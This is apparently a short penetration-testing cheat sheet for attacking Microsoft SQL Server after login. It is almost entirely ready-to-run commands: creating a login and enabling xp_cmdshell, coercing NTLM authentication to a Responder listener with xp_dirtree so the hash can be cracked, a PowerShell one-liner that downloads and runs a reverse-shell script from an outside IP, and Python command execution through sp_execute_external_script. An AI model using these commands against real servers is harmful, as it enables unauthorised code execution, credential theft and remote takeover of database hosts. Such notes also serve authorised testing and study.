## MSSQL methodology

Use impacket to connect mssqlclient.py user@ip

Once inside:

```
SQL> select name, database_id, create_date FROM sys.databases ;

create login cmdshell with password = 'test1'
go
use master
go
create user cmdshell for login cmdshell
go
grant execute on xp_cmdshell to cmdshell

-- this turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
-- this enables xp_cmdshell
sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
sudo responder -I <interface> #Run that in other console
SQL> exec master..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' #Steal the NTLM hash, crack it with john or hashcat

#Try to enable code execution
SQL> enable_xp_cmdshell

#Execute code, 2 sintax, for complex and non complex cmds
SQL> xp_cmdshell whoami /all
SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
```

# Import other lenguaje
```
EXEC sp_execute_external_script @language = N'Python',
@script = N'
import os
os.system("whoami")
'
```
